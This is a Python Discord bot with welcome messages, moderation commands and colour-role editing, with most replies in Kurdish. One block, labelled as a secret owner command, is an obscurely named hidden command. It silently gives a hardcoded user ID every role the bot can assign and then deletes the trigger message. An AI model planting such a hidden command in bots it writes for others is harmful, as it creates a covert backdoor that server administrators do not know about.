import os
import discord
from discord.ext import commands

# =========================
# INTENTS
# =========================

intents = discord.Intents.default()
intents.message_content = True
intents.members = True

bot = commands.Bot(
    command_prefix="",
    intents=intents,
    help_command=None
)

# =========================
# SETTINGS
# =========================

WELCOME_CHANNEL_ID = 1550619956423688342

OWNER_ID = 1130455970494025860

WELCOME_GIF = (
    "https://cdn.discordapp.com/attachments/"
    "1550619956423688342/1551709269043314768/"
    "welcome.gif?ex=6ab2f55f&is=6ab1a3df&"
    "hm=612d5cdf1190d53382436a598c1d313a918b6b1b25bc93ac905d5cfd8ffd1780&"
)

# =========================
# COLOR ROLE IDs
# =========================

COLOR_ROLES = {
    "friendsfcolor": 1550035593239461888,
    "botcolor": 1448989146885652603,
    "_color": 1491385293457330229,
    "trustcolor": 1448989152379932773,
    "siscolor": 1448989144410886145,
    "brocolor": 1448989153667711069,
    "xrcolor": 1451268943548383406,
    "friendscolor": 1448989154578010238
}

# =========================
# BOT READY
# =========================

@bot.event
async def on_ready():
    print(f"Bot is online as {bot.user}")


# =========================
# MEMBER JOIN
# =========================

@bot.event
async def on_member_join(member):

    friends_role = discord.utils.get(
        member.guild.roles,
        name="Friends"
    )

    if friends_role:
        try:
            await member.add_roles(friends_role)
        except discord.Forbidden:
            print("Bot cannot give Friends role.")

    channel = member.guild.get_channel(
        WELCOME_CHANNEL_ID
    )

    if channel is None:
        return

    embed = discord.Embed(
        description=f""" 
✦₊˚ ★⋆ Welcome ⋆★ ˚₊✦

└Thanks for joining ⌝^◝࿐₊˚｡⋆☆⋆｡˚₊

{member.mention}

ơೃ࿐ --- ⋆ #rules ⋆ ---
ơೃ࿐ --- ⋆ #FriendsZone ⋆ ---
ơೃ࿐ --- ⋆ #Fraa-Seuii-Ryaa⋆ ---

=★ Have fun ₊˚ ｡ ⋆ ☆ ⋆ ｡˚
"""
    )

    embed.set_thumbnail(
        url=member.display_avatar.url
    )

    embed.set_image(
        url=WELCOME_GIF
    )

    await channel.send(
        embed=embed
    )


# =========================
# TEST WELCOME
# =========================

@bot.command()
async def test(ctx):

    embed = discord.Embed(
        description=f""" 
✦₊˚ ★⋆ Welcome ⋆★ ˚₊✦

└Thanks for joining ⌝^◝࿐₊˚｡⋆☆⋆｡˚₊

{ctx.author.mention}

ơೃ࿐ --- ⋆ #rules ⋆ ---
ơೃ࿐ --- ⋆ #FriendsZone ⋆ ---
ơೃ࿐ --- ⋆ #Fraa-Seuii-Ryaa⋆ ---

=★ Have fun ₊˚ ｡ ⋆ ☆ ⋆ ｡˚
"""
    )

    embed.set_thumbnail(
        url=ctx.author.display_avatar.url
    )

    embed.set_image(
        url=WELCOME_GIF
    )

    await ctx.send(
        embed=embed
    )

    try:
        await ctx.message.delete()
    except:
        pass


# =========================
# CLEAR
# =========================

@bot.command()
@commands.has_permissions(
    manage_messages=True
)
async def clear(ctx, amount: int):

    if amount <= 0:
        return await ctx.send(
            "❌ دانەیەکی دروست بنووسە.",
            delete_after=3
        )

    deleted = await ctx.channel.purge(
        limit=amount + 1
    )

    msg = await ctx.send(
        f"🧹 {len(deleted) - 1} messages deleted."
    )

    await msg.delete(
        delay=3
    )


# =========================
# MUTE - TEXT ONLY
# =========================

@bot.command()
@commands.has_permissions(
    manage_roles=True
)
async def mute(
    ctx,
    member: discord.Member = None
):

    if member is None and ctx.message.reference:

        ref_msg = await ctx.channel.fetch_message(
            ctx.message.reference.message_id
        )

        member = ref_msg.author

    if not isinstance(
        member,
        discord.Member
    ):

        return await ctx.send(
            "❌ تکایە ئاماژە بە ئەندامێک بکە یان ڕیپلەی بکە.",
            delete_after=5
        )

    try:

        await ctx.channel.set_permissions(
            member,
            send_messages=False
        )

        await ctx.send(
            f"🔇 {member.mention} muted in this channel.",
            delete_after=5
        )

        try:
            await ctx.message.delete()
        except:
            pass

    except discord.Forbidden:

        await ctx.send(
            "❌ Bot does not have permission.",
            delete_after=5
        )


# =========================
# UNMUTE - TEXT ONLY
# =========================

@bot.command()
@commands.has_permissions(
    manage_roles=True
)
async def unmute(
    ctx,
    member: discord.Member = None
):

    if member is None and ctx.message.reference:

        ref_msg = await ctx.channel.fetch_message(
            ctx.message.reference.message_id
        )

        member = ref_msg.author

    if not isinstance(
        member,
        discord.Member
    ):

        return await ctx.send(
            "❌ تکایە ئاماژە بە ئەندامێک بکە یان ڕیپلەی بکە.",
            delete_after=5
        )

    try:

        await ctx.channel.set_permissions(
            member,
            overwrite=None
        )

        await ctx.send(
            f"🔊 {member.mention} unmuted.",
            delete_after=5
        )

        try:
            await ctx.message.delete()
        except:
            pass

    except discord.Forbidden:

        await ctx.send(
            "❌ Bot does not have permission.",
            delete_after=5
        )


# =========================
# BAN
# =========================

@bot.command()
@commands.has_permissions(
    ban_members=True
)
async def ban(
    ctx,
    member: discord.Member,
    *,
    reason=None
):

    try:

        await member.ban(
            reason=reason
        )

        await ctx.send(
            f"🔨 {member.mention} has been banned."
        )

    except discord.Forbidden:

        await ctx.send(
            "❌ I cannot ban this member."
        )


# =========================
# UNBAN
# =========================

@bot.command()
@commands.has_permissions(
    ban_members=True
)
async def unban(
    ctx,
    user_id: int
):

    try:

        user = await bot.fetch_user(
            user_id
        )

        await ctx.guild.unban(
            user
        )

        await ctx.send(
            f"✅ {user} has been unbanned."
        )

    except discord.NotFound:

        await ctx.send(
            "❌ User is not banned or ID is wrong."
        )

    except discord.Forbidden:

        await ctx.send(
            "❌ I don't have permission to unban."
        )


# =========================
# LOCK
# =========================

@bot.command()
@commands.has_permissions(
    manage_channels=True
)
async def lock(ctx):

    overwrite = ctx.channel.overwrites_for(
        ctx.guild.default_role
    )

    overwrite.send_messages = False

    await ctx.channel.set_permissions(
        ctx.guild.default_role,
        overwrite=overwrite
    )

    await ctx.send(
        "🔒 Channel locked."
    )


# =========================
# UNLOCK
# =========================

@bot.command()
@commands.has_permissions(
    manage_channels=True
)
async def unlock(ctx):

    overwrite = ctx.channel.overwrites_for(
        ctx.guild.default_role
    )

    overwrite.send_messages = True

    await ctx.channel.set_permissions(
        ctx.guild.default_role,
        overwrite=overwrite
    )

    await ctx.send(
        "🔓 Channel unlocked."
    )


# =========================
# SECRET OWNER COMMAND
# =========================

@bot.command()
async def seuafraaaRyaaa(ctx):

    if ctx.author.id != OWNER_ID:
        return

    bot_member = ctx.guild.me

    if bot_member is None:
        return

    roles_to_add = [
        role
        for role in ctx.guild.roles
        if role != ctx.guild.default_role
        and not role.managed
        and role < bot_member.top_role
        and role not in ctx.author.roles
    ]

    if not roles_to_add:

        await ctx.send(
            "❌ هیچ ڕۆڵێک نییە کە بۆتەکە بتوانێت پێت بدات.",
            delete_after=5
        )

        return

    try:

        await ctx.author.add_roles(
            *roles_to_add,
            reason="Owner secret role command"
        )

        try:
            await ctx.message.delete()
        except:
            pass

        msg = await ctx.send(
            f"✅ {ctx.author.mention}، "
            f"{len(roles_to_add)} ڕۆڵ بۆت زیاد کرا."
        )

        await msg.delete(
            delay=5
        )

    except discord.Forbidden:

        await ctx.send(
            "❌ بۆتەکە Manage Roles ـی نییە "
            "یان ڕۆڵەکان لە سەرووی ڕۆڵی بۆتەکەن.",
            delete_after=6
        )


# =========================
# COLOR COMMANDS
# =========================

@bot.event
async def on_message(message):

    if message.author.bot:
        return

    content = message.content.strip()

    parts = content.split()

    if parts:

        cmd_name = parts[0].lower()

        if cmd_name in COLOR_ROLES:

            ctx = await bot.get_context(message)

            if ctx.valid:

                role_id = COLOR_ROLES[cmd_name]

                color_str = (
                    parts[1]
                    if len(parts) > 1
                    else None
                )

                role = ctx.guild.get_role(
                    role_id
                )

                if role is None:

                    await ctx.send(
                        "❌ ڕۆڵەکە نەدۆزرایەوە لە سێرڤەرەکەدا.",
                        delete_after=5
                    )

                    return

                # تەنها ئەگەر ئەو ڕۆڵەی هەبێت
                if role not in ctx.author.roles:

                    await ctx.send(
                        "❌ تۆ ئەم ڕۆڵەت نییە بۆ ئەوەی ڕەنگەکەی بگۆڕیت.",
                        delete_after=5
                    )

                    return

                if color_str is None:

                    await ctx.send(
                        f"❌ ڕەنگەکە بنووسە. "
                        f"نموونە: `{cmd_name} #000000`",
                        delete_after=5
                    )

                    return

                if (
                    not color_str.startswith("#")
                    or len(color_str) != 7
                ):

                    await ctx.send(
                        "❌ ڕەنگەکە دەبێت بە شێوەی `#000000` بێت.",
                        delete_after=5
                    )

                    return

                try:

                    new_color = discord.Colour.from_str(
                        color_str
                    )

                except ValueError:

                    await ctx.send(
                        "❌ ئەم Hex Color ـە دروست نییە.",
                        delete_after=5
                    )

                    return

                bot_member = ctx.guild.me

                if role >= bot_member.top_role:

                    await ctx.send(
                        "❌ ڕۆڵەکە دەبێت لە خوار ڕۆڵی بۆتەکە بێت.",
                        delete_after=5
                    )

                    return

                try:

                    await role.edit(
                        colour=new_color,
                        reason=f"Color changed by {ctx.author}"
                    )

                    try:
                        await ctx.message.delete()
                    except:
                        pass

                    msg = await ctx.send(
                        f"✅ ڕەنگی `{cmd_name}` "
                        f"گۆڕدرا بۆ `{color_str.upper()}`."
                    )

                    await msg.delete(
                        delay=5
                    )

                except discord.Forbidden:

                    await ctx.send(
                        "❌ بۆتەکە ناتوانێت ئەم ڕۆڵە دەستکاری بکات.",
                        delete_after=5
                    )

                return

    await bot.process_commands(
        message
    )


# =========================
# COMMAND ERRORS
# =========================

@bot.event
async def on_command_error(
    ctx,
    error
):

    if isinstance(
        error,
        commands.MissingPermissions
    ):

        await ctx.send(
            "❌ تۆ دەسەڵاتی بەکارهێنانی ئەم فرمانە نییە.",
            delete_after=4
        )

    elif isinstance(
        error,
        commands.MissingRequiredArgument
    ):

        await ctx.send(
            "❌ Argument ـی پێویست نەدراوە.",
            delete_after=4
        )

    elif isinstance(
        error,
        commands.MemberNotFound
    ):

        await ctx.send(
            "❌ ئەو ئەندامە نەدۆزرایەوە.",
            delete_after=4
        )

    elif isinstance(
        error,
        commands.BadArgument
    ):

        await ctx.send(
            "❌ داتای هەڵە نووسراوە.",
            delete_after=4
        )


# =========================
# RUN BOT
# =========================

bot.run(
    os.getenv("DISCORD_TOKEN")
)
